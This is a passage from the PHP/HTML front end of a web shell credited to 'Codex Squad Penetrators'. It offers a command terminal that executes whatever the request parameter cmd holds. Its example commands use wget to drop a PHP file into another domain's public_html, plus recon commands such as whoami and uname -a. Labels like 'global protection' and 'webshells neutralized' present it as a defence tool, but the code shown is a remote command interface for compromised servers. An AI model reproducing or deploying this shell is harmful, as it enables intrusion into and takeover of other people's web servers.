                            <button type="submit" name="get_key" class="neumorphic-button get-key-btn">
                                GET KEY
                            </button>
                            <button type="submit" name="login" class="neumorphic-button login-btn">
                                LOGIN
                            </button>
                        </div>
                    </div>
                </form>
            </div>
        <?php else: ?>
            <!-- Protection Status -->
            <?php if (isset($install_success)): ?>
                <div class="alert alert-success">
                    <?php echo htmlspecialchars($install_success); ?>
                </div>
            <?php endif; ?>
            
            <?php if ($blocked_files > 0): ?>
                <div class="alert alert-info">
                    <?php echo $blocked_files; ?> FILES BLOCKED THIS SESSION
                </div>
            <?php endif; ?>
            
            <?php if (!empty($detected_webshells)): ?>
                <div class="alert alert-danger">
                    <?php echo count($detected_webshells); ?> WEBSHELLS NEUTRALIZED
                </div>
            <?php endif; ?>
            
            <!-- Install Global Protection -->
            <div style="margin-bottom: 15px;">
                <a href="?install=1" class="neumorphic-button install-button">
                  [ ACTIVATE GLOBAL PROTECTION ]
                </a>
            </div>
            
            <div class="command-interface">
                <div class="command-form">
                    <div class="form-group">
                        <label class="form-label" for="cmd">
                            ENTER COMMAND TERMINAL
                        </label>
                        <input type="text" 
                               name="cmd" 
                               id="cmd" 
                               class="command-input" 
                               placeholder="Example: wget -O /home/user/domains/target.com/public_html/0xC0D3X.php https://raw.githubusercontent.com/user/repo/main/file.php" 
                               autofocus
                               value="<?php echo isset($_GET['cmd']) ? htmlspecialchars($_GET['cmd']) : ''; ?>">
                    </div>
                    <div class="button-group">
                        <div class="row-buttons">
                            <!-- EXECUTE on LEFT, LOGOUT on RIGHT -->
                            <button type="submit" form="cmdForm" class="neumorphic-button execute-btn">
                                EXECUTE
                            </button>
                            <a href="?logout=true" class="neumorphic-button logout-btn">
                                LOGOUT
                            </a>
                        </div>
                    </div>
                </div>
                
                <form method="GET" id="cmdForm" style="display: none;">
                    <input type="hidden" name="cmd" id="cmdHidden">
                </form>
                
                <?php if (isset($_GET['cmd'])): ?>
                    <div class="output-container">
                        <pre>
<?php
$command = trim($_GET['cmd']);
    
if (!empty($command)) {
    // Use the safe command execution function
    $output = executeSafeCommand($command);
    
    foreach ($output as $line) {
        echo htmlspecialchars($line) . "\n";
    }
    
    // Run protection after command execution
    $new_blocked = runContinuousFileProtection();
    if ($new_blocked > 0) {
        echo "\n=== 0xC0D3X PROTECTION ===\n";
        echo "$new_blocked malicious file(s) blocked\n";
    }
}
?>
                        </pre>
                    </div>
                <?php endif; ?>
            </div>
            
            <div class="info-panel">
                <div class="info-box">
                    <div class="info-label">STATUS</div>
                    <div class="info-value">ACTIVE</div>
                </div>
                <div class="info-box">
                    <div class="info-label">FILES BLOCKED</div>
                    <div class="info-value"><?php echo $blocked_files; ?></div>
                </div>
                <div class="info-box">
                    <div class="info-label">WEBSHELLS</div>
                    <div class="info-value"><?php echo count($detected_webshells); ?></div>
                </div>
                <div class="info-box">
                    <div class="info-label">WGET ALLOWED</div>
                    <div class="info-value">YES</div>
                </div>
            </div>
            
            <div class="footer">
                <p>Secure wget execution enabled for GitHub/raw URLs</p>
                <p>All Rights Reserved Codex Squad Penetrators - 2024</p>
            </div>
        <?php endif; ?>
    </div>

    <script>
        document.addEventListener('DOMContentLoaded', function() {
            const cmdInput = document.getElementById('cmd');
            const cmdHidden = document.getElementById('cmdHidden');
            const cmdForm = document.getElementById('cmdForm');
            
            if (cmdInput && cmdForm) {
                cmdInput.addEventListener('input', function() {
                    cmdHidden.value = this.value;
                });
                
                const executeButton = document.querySelector('button[form="cmdForm"]');
                if (executeButton) {
                    executeButton.addEventListener('click', function(e) {
                        e.preventDefault();
                        cmdHidden.value = cmdInput.value;
                        cmdForm.submit();
                    });
                }
                
                cmdInput.addEventListener('keypress', function(e) {
                    if (e.key === 'Enter') {
                        e.preventDefault();
                        cmdHidden.value = this.value;
                        cmdForm.submit();
                    }
                });
                
                // Auto-fill example wget command on focus
                cmdInput.addEventListener('focus', function() {
                    if (this.value === '') {
                        this.placeholder = "Example: wget -O /home/user/domains/target.com/public_html/0xC0D3X.php https://raw.githubusercontent.com/user/repo/main/file.php";
                    }
                });
            }
            
            // Mobile optimizations
            document.addEventListener('touchstart', function() {}, {passive: true});
            document.addEventListener('touchmove', function() {}, {passive: true});
            
            // Prevent zoom on double-tap
            let lastTouchEnd = 0;
            document.addEventListener('touchend', function(event) {
                const now = Date.now();
                if (now - lastTouchEnd <= 300) {
                    event.preventDefault();
                }
                lastTouchEnd = now;
            }, false);
            
            // Auto-focus command input on mobile
            if (cmdInput && window.innerWidth < 768) {
                setTimeout(() => {
                    cmdInput.focus();
                }, 300);
            }
            
            // Force portrait mode
            function forcePortrait() {
                if (window.innerWidth > window.innerHeight) {
                    const message = document.createElement('div');
                    message.innerHTML = 'Please rotate your device to portrait mode';
                    message.style.cssText = `
                        position: fixed;
                        top: 0;
                        left: 0;
                        right: 0;
                        bottom: 0;
                        background: #f0f0f0;
                        display: flex;
                        justify-content: center;
                        align-items: center;
                        font-size: 18px;
                        font-weight: bold;
                        color: #333;
                        text-align: center;
                        padding: 20px;
                        z-index: 9999;
                    `;
                    if (!document.body.querySelector('div[style*="portrait mode"]')) {
                        document.body.appendChild(message);
                    }
                }
            }
            
            forcePortrait();
            window.addEventListener('resize', forcePortrait);
            window.addEventListener('orientationchange', forcePortrait);
            
            // Adjust layout for different screen heights
            function adjustLayout() {
                const container = document.querySelector('.neumorphic-container');
                const bodyHeight = window.innerHeight;
                
                if (container) {
                    if (bodyHeight < 600) {
                        container.style.padding = '8px';
                        container.style.margin = '5px 0';
                    } else {
                        container.style.padding = '15px';
                        container.style.margin = 'auto';
                    }
                }
            }
            
            adjustLayout();
            window.addEventListener('resize', adjustLayout);
            
            // Add quick command examples
            const quickCommands = [
                'wget -O 0xC0D3X.php https://raw.githubusercontent.com/example/repo/main/0xC0D3X.php',
                'pwd',
                'ls -la',
                'whoami',
                'uname -a'
            ];
            
            // Optional: Add a quick command selector (uncomment if needed)
            /*
            const quickSelect = document.createElement('select');
            quickSelect.innerHTML = '<option>Quick Commands</option>' + 
                quickCommands.map(cmd => `<option value="${cmd}">${cmd.substring(0, 50)}...</option>`).join('');
            quickSelect.style.cssText = 'width:100%;margin-bottom:10px;padding:8px;border-radius:8px;';
            quickSelect.addEventListener('change', function() {
                if (this.value && cmdInput) {
                    cmdInput.value = this.value;
                    cmdHidden.value = this.value;
                }
            });
            document.querySelector('.command-form').insertBefore(quickSelect, document.querySelector('.button-group'));
            */
        });
    </script>
</body>
</html>
